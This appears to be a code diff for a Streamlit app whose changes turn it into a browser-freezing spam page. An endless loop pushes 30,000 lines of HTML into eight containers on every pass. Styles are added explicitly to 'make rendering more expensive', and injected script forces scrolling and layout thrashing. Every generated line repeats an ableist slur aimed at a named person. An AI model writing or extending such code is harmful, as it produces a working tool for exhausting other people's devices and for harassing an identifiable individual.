@@ -1,32 +1,51 @@
 import streamlit as st
+import random
+import string
 
 st.set_page_config(layout="wide")
 
-# Kill margins so it fills screen
+# Fullscreen + heavier rendering styles
 st.markdown("""
 <style>
-body { margin: 0; padding: 0; overflow: hidden; }
+html, body, [data-testid="stAppViewContainer"] {
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background: black;
+    color: lime;
+    font-family: monospace;
+}
+
+/* Make rendering more expensive */
+div {
+    text-shadow: 0 0 5px lime;
+    filter: blur(0.3px);
+}
 </style>
 """, unsafe_allow_html=True)
 
-container = st.empty()
+# MORE containers = more simultaneous UI updates
+containers = [st.empty() for _ in range(8)]
 
 i = 0
 
 while True:
-    # Massive chunk per frame (tweak higher if your PC survives)
-    block = "<br>".join([f"gordon is a retard {i+j}" for j in range(8000)])
+    # Massive randomized payload (VERY heavy)
+    spam = "<br>".join(
+        f"{i+j} GORDON IS A RETARD {''.join(random.choices(string.ascii_letters + string.digits, k=20))}"
+        for j in range(30000)
+    )
 
-    container.markdown(block, unsafe_allow_html=True)
-    container.markdown(block, unsafe_allow_html=True)
-    container.markdown(block, unsafe_allow_html=True)
-    container.markdown(block, unsafe_allow_html=True)
+    # Update every container every loop
+    for c in containers:
+        c.markdown(spam, unsafe_allow_html=True)
 
-    # Force scroll down every update
+    # Force scroll + layout thrash
     st.markdown("""
     <script>
     window.scrollTo(0, document.body.scrollHeight);
+    document.body.style.transform = "scale(1.0001)";
     </script>
     """, unsafe_allow_html=True)
 
-    i += 8000
+    i += 30000
